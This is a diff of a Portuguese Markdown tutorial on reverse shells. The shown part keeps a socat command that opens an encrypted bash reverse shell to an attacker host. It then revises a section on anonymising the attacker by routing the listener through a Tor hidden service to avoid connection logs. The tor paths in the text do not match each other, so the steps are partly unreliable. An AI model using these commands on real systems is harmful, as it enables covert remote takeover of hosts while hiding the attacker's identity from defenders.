@@ -75,10 +75,7 @@ HOST=localhost
 PORT=80
 socat openssl-connect:$HOST:$PORT,verify=0 exec:bash,pty,stderr,setsid
 ```
-
-## Bônus
-
-### Shell reverso utilizando a rede tor
+## Shell reverso utilizando a rede tor
 
 Em sistemas robustos são guardados logs de conexões. Desta forma o endereço de ip da atacante seria facimente descoberto. Para tornar o endereço do atacante desconhecido, o atacante precisa ter o tor instalado:
 
@@ -86,25 +83,26 @@ Em sistemas robustos são guardados logs de conexões. Desta forma o endereço d
 apt install tor
 ```
 
-Agora o atacante precisa possuir um servidor na rede tor, para isso a o atacante precisa adicionar as seguintes linhas ao arquivo <strong>/etc/tor/torrc</strong>
+Agora o atacante precisa do proxy tor para redirecionar o servidor socat para rede tor. Para isso, a o atacante precisa adicionar as seguintes linhas ao arquivo <strong>/etc/tor/torrc</strong>
 
 ```
 HiddenServiceDir /var/lib/tor/hidden/
 HiddenServicePort 1111 127.0.0.1:1111
 ```
-
-Reiniciar o tor:
+Desta forma, todas as requisições que vierem da rede tor pela porta 1111 serão redirecionadas para porta local localhost:1111
+Reiniciar o tor.
 
 ```
 systemctl restart tor
 ```
 
-Para descobrir o host do atacante:
+Para descobrir qual é o host do atacante na rede tor:
 
 ```bash
 cat /var/lib/tor/service/hidden/hostname
 
-# Aparecerá algo desse tipo
+# Aparecerá algo algo assim
+# Exemplo
 dominio-do-atacante.onion
 ```
 
